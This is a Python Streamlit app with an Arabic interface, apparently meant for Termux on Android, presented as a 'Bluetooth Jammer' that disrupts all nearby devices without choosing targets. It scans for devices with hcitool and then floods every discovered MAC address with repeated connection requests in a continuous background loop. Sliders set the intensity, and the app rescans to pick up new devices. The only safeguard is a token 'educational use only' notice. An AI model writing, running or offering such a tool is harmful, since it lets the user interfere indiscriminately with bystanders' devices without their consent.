#!/usr/bin/env python3
# أداة Jammer بلوتوث شامل - يعمل على أندرويد (Termux)
# تشويش على جميع الأجهزة القريبة بدون اختيار
# التشغيل: streamlit run bluetooth_jammer.py

import streamlit as st
import subprocess
import time
import threading
import re

# إعداد الصفحة
st.set_page_config(
    page_title="Bluetooth Jammer - منارة نونو",
    page_icon="📡",
    layout="centered"
)

st.markdown("# 📡 Bluetooth Jammer شامل")
st.markdown("### تشويش على جميع الأجهزة القريبة")
st.markdown("---")

st.warning("⚠️ هذا للاستخدام التعليمي فقط. تحقق من القوانين المحلية.")

# ============================================================
# حالة الجلسة
# ============================================================
if 'jamming' not in st.session_state:
    st.session_state.jamming = False
if 'devices' not in st.session_state:
    st.session_state.devices = []
if 'log' not in st.session_state:
    st.session_state.log = []
if 'attack_active' not in st.session_state:
    st.session_state.attack_active = False

# ============================================================
# وظائف التشويش
# ============================================================

def scan_bluetooth():
    """مسح الأجهزة القريبة"""
    try:
        result = subprocess.run(
            ["hcitool", "scan"],
            capture_output=True,
            text=True,
            timeout=10
        )
        lines = result.stdout.splitlines()
        devices = []
        for line in lines[1:]:
            if line.strip():
                parts = line.split(maxsplit=1)
                if len(parts) == 2:
                    mac = parts[0]
                    name = parts[1]
                    devices.append({"mac": mac, "name": name})
                elif len(parts) == 1:
                    devices.append({"mac": parts[0], "name": "Unknown"})
        return devices
    except Exception as e:
        return []

def jam_device(mac):
    """تشويش على جهاز واحد"""
    try:
        subprocess.run(
            ["hcitool", "cc", mac],
            capture_output=True,
            timeout=1
        )
        return True
    except:
        return False

def jam_all_devices(devices, intensity=3):
    """تشويش على جميع الأجهزة"""
    if not devices:
        return 0
    
    count = 0
    for device in devices:
        mac = device["mac"]
        for _ in range(intensity):
            if not st.session_state.jamming:
                return count
            jam_device(mac)
            count += 1
            time.sleep(0.1)
    
    return count

def continuous_jam(devices, intensity=3, interval=2):
    """تشويش مستمر على جميع الأجهزة"""
    while st.session_state.jamming:
        if devices:
            count = jam_all_devices(devices, intensity)
            log_msg = f"✅ تم تشويش على {count} جهاز"
            st.session_state.log.append(log_msg)
            if len(st.session_state.log) > 50:
                st.session_state.log = st.session_state.log[-50:]
        else:
            log_msg = "⚠️ لا توجد أجهزة للتشويش"
            st.session_state.log.append(log_msg)
        
        # إعادة المسح لالتقاط أجهزة جديدة
        new_devices = scan_bluetooth()
        if new_devices:
            st.session_state.devices = new_devices
        
        time.sleep(interval)

# ============================================================
# عرض الأجهزة المكتشفة
# ============================================================

st.markdown("### 📱 الأجهزة القريبة")

# زر المسح
if st.button("🔍 مسح الأجهزة", use_container_width=True):
    with st.spinner("⏳ جاري المسح..."):
        devices = scan_bluetooth()
        if devices:
            st.session_state.devices = devices
            st.success(f"✅ تم العثور على {len(devices)} جهاز")
        else:
            st.warning("❌ لم يتم العثور على أجهزة. تأكد من تشغيل البلوتوث.")

# عرض الأجهزة
if st.session_state.devices:
    device_data = []
    for i, device in enumerate(st.session_state.devices):
        device_data.append({
            "رقم": i + 1,
            "الاسم": device["name"],
            "MAC": device["mac"]
        })
    st.dataframe(device_data, use_container_width=True)
    st.caption(f"📊 إجمالي الأجهزة: {len(st.session_state.devices)}")
else:
    st.info("📌 اضغط على 'مسح الأجهزة' لكشف الأجهزة القريبة")

# ============================================================
# إعدادات التشويش
# ============================================================

st.markdown("---")
st.markdown("### ⚙️ إعدادات التشويش")

col1, col2 = st.columns(2)
with col1:
    intensity = st.slider(
        "شدة التشويش:",
        min_value=1,
        max_value=10,
        value=5,
        help="عدد الطلبات المرسلة لكل جهاز"
    )
with col2:
    interval = st.slider(
        "فترة التحديث (ثواني):",
        min_value=1,
        max_value=10,
        value=3,
        help="المدة بين كل جولة تشويش"
    )

# ============================================================
# أزرار التحكم
# ============================================================

st.markdown("---")
col1, col2 = st.columns(2)

with col1:
    if not st.session_state.jamming:
        if st.button("🚀 بدء التشويش الشامل", use_container_width=True):
            if not st.session_state.devices:
                st.error("❌ لا توجد أجهزة. قم بالمسح أولاً.")
            else:
                st.session_state.jamming = True
                st.session_state.attack_active = True
                st.success("🔥 بدأ التشويش على جميع الأجهزة القريبة")
                
                # تشغيل التشويش في خيط منفصل
                thread = threading.Thread(
                    target=continuous_jam,
                    args=(st.session_state.devices, intensity, interval),
                    daemon=True
                )
                thread.start()

with col2:
    if st.session_state.jamming:
        if st.button("🛑 إيقاف التشويش", use_container_width=True):
            st.session_state.jamming = False
            st.session_state.attack_active = False
            st.warning("⏹️ تم إيقاف التشويش")

# ============================================================
# حالة التشويش
# ============================================================

if st.session_state.jamming:
    st.info("🔄 التشويش قيد التنفيذ...")
    st.progress(1.0, text="🔥 جاري تشويش الأجهزة القريبة")

# ============================================================
# سجل التشويش
# ============================================================

st.markdown("---")
st.markdown("### 📋 سجل التشويش")

if st.session_state.log:
    for entry in st.session_state.log[-15:]:
        st.text(entry)
else:
    st.info("لا يوجد سجل بعد")

# زر مسح السجل
if st.button("🧹 مسح السجل", use_container_width=True):
    st.session_state.log = []
    st.success("✅ تم مسح السجل")

# ============================================================
# إحصائيات
# ============================================================

if st.session_state.devices:
    st.markdown("---")
    st.markdown("### 📊 إحصائيات")
    
    col1, col2, col3 = st.columns(3)
    with col1:
        st.metric("📱 الأجهزة المكتشفة", len(st.session_state.devices))
    with col2:
        st.metric("⚡ شدة التشويش", intensity)
    with col3:
        status = "🟢 نشط" if st.session_state.jamming else "🔴 متوقف"
        st.metric("📡 الحالة", status)

# ============================================================
# التذييل
# ============================================================

st.markdown("---")
st.markdown("⚠️ **ملاحظات مهمة:**")
st.markdown("1. هذه الأداة تشوش على **جميع** الأجهزة القريبة")
st.markdown("2. تأكد من تشغيل البلوتوث على هاتفك")
st.markdown("3. قد لا تعمل على بعض الأجهزة بسبب إعدادات الأمان")
st.markdown("4. للاستخدام التعليمي فقط")

st.markdown("made by @cheifbreef on discord :)")